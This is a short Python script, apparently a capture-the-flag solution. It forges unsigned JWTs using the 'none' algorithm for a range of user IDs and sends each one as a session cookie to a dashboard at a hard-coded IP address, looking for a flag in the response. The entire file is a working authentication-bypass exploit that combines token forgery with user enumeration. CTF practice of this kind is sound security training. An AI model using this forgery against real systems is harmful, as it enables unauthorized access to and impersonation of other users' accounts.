import requests, json, base64, re

BASE = "http://217.216.111.220:3030"

def make_jwt(user):
    header = {"alg":"none","typ":"JWT"}
    payload = {"sub": user}

    b64 = lambda x: base64.urlsafe_b64encode(json.dumps(x).encode()).rstrip(b'=').decode()
    return f"{b64(header)}.{b64(payload)}."

def check_user(u):
    jwt = make_jwt(u)
    r = requests.get(BASE + "/dashboard", cookies={"access_token": jwt})
    if r.status_code != 200:
        print(f"[{u}] no access")
        return None

    text = r.text

    found = re.search(r"Gematik2025\{.*?\}", text)
    if found:
        print("\n\nðŸš© FLAG FOUND ðŸš©")
        print(f"[USER] {u}")
        print(found.group(0))
        return True

    print(f"[{u}] ok")
    return False


for i in range(100):
    user = f"P2300{str(i).zfill(2)}"
    res = check_user(user)
    if res is True:
        break
